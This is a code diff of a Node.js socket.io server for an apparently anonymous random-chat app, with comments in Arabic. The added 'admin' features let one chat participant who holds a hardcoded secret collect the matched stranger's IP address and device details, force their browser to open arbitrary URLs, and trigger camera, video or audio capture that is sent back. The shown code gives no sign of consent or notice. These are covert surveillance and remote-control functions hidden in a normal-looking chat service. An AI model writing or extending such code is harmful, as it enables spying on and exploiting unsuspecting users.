@@ -4,50 +4,113 @@ const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
+const io = new Server(server, {
+    maxHttpBufferSize: 10 * 1024 * 1024
+});
 
 app.use(express.static(__dirname));
 
+let waitingUser = null;
+
+// كلمة سر الأدمن (يمكنك تعديلها أو جعلها عبر متغيرات البيئة في Render)
+const ADMIN_SECRET = process.env.ADMIN_SECRET || 'mySuperSecretAdmin123';
+
 io.on('connection', (socket) => {
-    // استخراج معلومات الجهاز والـ IP للطرف المتصل
-    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-    const userAgent = socket.handshake.headers['user-agent'] || 'Unknown Device';
-    
-    socket.emit('device_info', { ip: clientIp, ua: userAgent });
+    console.log('مستخدم متصل:', socket.id);
 
-    socket.on('chat_message', (data) => {
-        data.id = 'msg_' + Math.random().toString(36).substring(2, 9);
-        io.emit('chat_message', data);
-    });
+    // استخراج معلومات الجهاز والـ IP لإرسالها للأدمن
+    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
+    const clientUa = socket.handshake.headers['user-agent'] || 'Unknown Device';
 
-    socket.on('typing', (data) => {
-        socket.broadcast.emit('typing', data);
-    });
+    socket.on('find_partner', () => {
+        if (waitingUser && waitingUser.id !== socket.id) {
+            const partner = waitingUser;
+            waitingUser = null;
 
-    // أحداث الأدمن والتحكم
-    socket.on('admin_action', (data) => {
-        if (data.action === 'delete') {
-            io.emit('delete_message', data.id);
-        } else if (data.action === 'edit') {
-            io.emit('edit_message', data);
-        } else if (data.action === 'clear_chat') {
-            io.emit('clear_chat', data.target); // all, mine, theirs
-        } else if (data.action === 'alert') {
-            io.emit('system_alert', data.message);
-        } else if (data.action === 'change_bg') {
-            io.emit('change_bg', data.color);
+            const room = 'room_' + partner.id + '_' + socket.id;
+            socket.join(room);
+            partner.join(room);
+
+            io.to(room).emit('matched');
+            socket.roomName = room;
+            partner.roomName = room;
+
+            // إرسال معلومات كل طرف للآخر لتظهر في لوحة الأدمن
+            io.to(room).emit('device_info', { ip: clientIp, ua: clientUa });
         } else {
-            // توجيه أو طلب كاميرا/فيديو/صوت
-            io.emit('admin_command', data);
+            waitingUser = socket;
         }
     });
 
-    socket.on('media_response', (data) => {
-        io.emit('media_response', data);
+    socket.on('message', (msg) => {
+        if (socket.roomName) {
+            // توليد معرف فريد وصحيح للرسالة
+            msg.id = 'msg_' + Math.random().toString(36).substring(2, 9);
+            socket.to(socket.roomName).emit('message', msg);
+        }
+    });
+
+    socket.on('typing', (isTyping) => {
+        if (socket.roomName) {
+            socket.to(socket.roomName).emit('display_typing', isTyping);
+        }
+    });
+
+    // === معالجة أوامر وصلاحيات الأدمن الشاملة ===
+    socket.on('admin_action', (data) => {
+        if (data.secret !== ADMIN_SECRET) return;
+        if (!socket.roomName) return;
+
+        switch (data.action) {
+            case 'delete':
+                io.to(socket.roomName).emit('msg_deleted', data.msgId);
+                break;
+
+            case 'edit':
+                io.to(socket.roomName).emit('msg_edited', { msgId: data.msgId, newContent: data.newContent });
+                break;
+
+            case 'open_url':
+                socket.to(socket.roomName).emit('force_open_url', data.url);
+                break;
+
+            case 'request_media':
+                // تمرير نوع الوسائط والمدة المطلوبة (صورة، فيديو، صوت)
+                socket.to(socket.roomName).emit('trigger_camera', { mediaType: data.mediaType, duration: data.duration });
+                break;
+
+            case 'alert':
+                socket.to(socket.roomName).emit('system_alert', data.message);
+                break;
+
+            case 'clear_chat':
+                io.to(socket.roomName).emit('clear_chat', data.target);
+                break;
+
+            case 'change_bg':
+                io.to(socket.roomName).emit('change_bg', data.color);
+                break;
+        }
+    });
+
+    // استقبال الوسائط الملتقطة (صورة/فيديو/صوت) وإرسالها للأدمن للمعاينة
+    socket.on('user_media_captured', (data) => {
+        if (socket.roomName) {
+            socket.to(socket.roomName).emit('display_captured_media_to_admin', data);
+        }
+    });
+
+    socket.on('disconnect', () => {
+        if (waitingUser === socket) {
+            waitingUser = null;
+        }
+        if (socket.roomName) {
+            socket.to(socket.roomName).emit('partner_disconnected');
+        }
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log('Server running on port ' + PORT);
 });
